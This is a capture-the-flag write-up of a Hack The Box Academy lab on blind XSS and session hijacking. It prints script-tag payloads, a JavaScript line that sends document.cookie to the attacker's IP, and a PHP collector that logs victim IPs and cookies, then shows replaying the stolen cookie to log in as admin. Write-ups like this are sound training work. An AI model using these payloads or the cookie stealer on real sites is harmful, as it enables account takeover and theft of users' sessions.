# Hack The Box Academy - Session Hijacking via Blind XSS | Write-up

> **Platform:** Hack The Box Academy &nbsp;•&nbsp; **Category:** Blind Cross-Site Scripting / Session Hijacking
>
> **Author:** Jithin Jelson

---

This is a session hijacking challenge, and the objective of this lab is to use blind XSS to retrieve cookie data from the victim's browser so that we can gain logged in access without knowing their credentials. With the ability to execute JavaScript on the victim's machine, we can collect their data and send it to our server to hijack their logged in session.

- **Target IP:** `10.129.69.119`
- **My IP:** `10.10.14.88`

---
## What I Learned

- How to identify a blind XSS, where your payload isn't reflected back to you but is instead reviewed by an admin in a panel you don't have access to
- How to find the vulnerable field by pointing a payload at each field name and watching which one triggers a callback on my listener
- How to steal a session cookie by hosting a script that sends document.cookie back to my server
- How to hijack a session by injecting the stolen cookie into the browser's storage to log in as the victim without their credentials

---

## Attack Overview
```mermaid
flowchart TD
    A([Start]) --> B[Submit dummy details]
    B --> C{Reflected back?}
    C -->|No, admin reviews| D[Confirmed blind XSS]
    D --> E{Test each field}
    E -->|Email / others fail| E
    E -->|imgurl callback| F[Vulnerable field found]
    F --> G[Host script.js to steal cookie]
    G --> H[Cookie saved to cookies.txt]
    H --> I[Inject cookie in dev tools]
    I --> J([Flag captured])

    style A fill:#1D9E75,stroke:#0F6E56,color:#fff
    style J fill:#D85A30,stroke:#993C1D,color:#fff
    style C fill:#3C3489,stroke:#7F77DD,color:#fff
    style E fill:#3C3489,stroke:#7F77DD,color:#fff
    style F fill:#085041,stroke:#1D9E75,color:#fff
```

## Reconnaissance

Normally we would perform an Nmap scan to begin the lab, but we have already been given the page we are to visit to perform our attack, which is `http://10.129.69.119/hijacking/`.

![Registration page](images/01-registration-page.png)
*Figure 1 - The registration page we're given to attack*

We can first test this site using dummy details.

![Dummy details filled into the registration form](images/02-dummy-details.png)
*Figure 2 - Filling in dummy registration details*

We can confirm that the attack we have to carry out is a blind XSS, as the page confirms that the page won't be shown to you or processed by you, and it is for an admin to review in a panel you don't have access to.

![Admin review confirmation message](images/03-admin-review.png)
*Figure 3 - The page confirming an admin will review our submission*

---

## Finding the Vulnerable Field

Now let's set up a listener with Netcat to help find us the correct payload to use and the vulnerable input field. Since we know that the password field is stored as a hash value, there is a good chance that won't be it.

Using the view source option we can locate all the field names.

![Viewing page source to find field names](images/04-view-source-fields.png)
*Figure 4 - Locating the field names via view source*

This is our initial payload:

```
<script src="http://10.10.14.88/fullname"></script>
<script src="http://10.10.14.88/username"></script>
password
jj@gmail.com><script src="http://10.10.14.88/email"></script>
<script src="http://10.10.14.88/imgurl"></script>
```
(note we don't need the field names, but just for good practice).

Seems like the email format is wrong, so that should eliminate another field that is potentially not vulnerable.

![Invalid email error eliminating the email field](images/05-invalid-email.png)
*Figure 5 - Invalid email error, ruling out the email field*

We waited for a while but got no response, so using PayloadsAllTheThings, a GitHub repo which can help us use blind XSS payloads, we tried different payloads to see which can work.

After a few attempts we seem to get a response which confirms the vulnerable point was the imgurl and the payload was:

![Listener catching the callback from the imgurl field](images/06-imgurl-confirmed.png)
*Figure 6 - Confirming the imgurl field is vulnerable*

```html
"><script src="http://10.10.14.88:8080/imgurl"></script>
```

These were all the payloads I had tested:

```html
<script src=http://10.10.14.88:8080></script>
'><script src=http://10.10.14.88:8080></script>
"><script src=http://10.10.14.88:8080></script>
```

---

## Stealing the Session Cookie

Now we have the vulnerable point and the payload, we can now inject a script to steal cookie data.

We can do this in 2 ways, we can use PHP or Netcat. In the demonstration I will be using a PHP script, as Netcat just dumps the raw HTTP request to your terminal, it doesn't parse anything or run multiple times automatically, so if multiple cookie bearing requests come in, you'd need to manually catch each one and you might miss earlier ones while reading the current one. A PHP script gets hosted properly, can run continuously, parses out the cookie value from each incoming request, and can write each one to a log file, so nothing gets lost and you can review them all afterward.

But first we can create the script which to send to our vulnerable field. Since this is an image URL vulnerability, a suitable script can be:

```javascript
new Image().src='http://10.10.14.88:8080/index.php?c='+document.cookie;
```

And we save this as `script.js`.

Now we can create our PHP server that splits each cookie onto a new line, so that even if multiple victims trigger the XSS exploit, we get all of their cookies in a file.

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

We can save this as `index.php`.

Now we can start our PHP listener.

![Starting the PHP listener](images/07-php-listener.png)
*Figure 7 - Starting the PHP server*

And use the following payload in the vulnerable field:

```html
"><script src="http://10.10.14.88:8080/script.js"></script>
```

We can see that the server got our file. We ran into an issue as our `index.php` didn't run, this is when I realised it was the wrong directory, so I changed it to home and ran it again.

![Wrong directory issue with index.php](images/08-wrong-directory.png)
*Figure 8 - Running into the wrong directory issue with index.php*

![script.js served and cookie request coming through](images/09-script-served.png)
*Figure 9 - script.js served and the cookie request coming through*

And success. Our PHP script was a success too.

![cookies.txt containing the captured cookie](images/10-cookies-txt.png)
*Figure 10 - cookies.txt with the victim's cookie saved*

---

## Hijacking the Session

Now we can go to the login page and use Shift+F9 to open storage and add our new cookie value.

![Injecting the stolen cookie via browser dev tools storage](images/11-cookie-storage.png)
*Figure 11 - Adding the stolen cookie into the browser's storage*

And we got our flag.

![Final flag captured as the admin](images/12-flag.png)
*Figure 12 - Logged in as admin and retrieving the flag*

---

<sub>Write-up by <b>Jithin Jelson</b></sub>
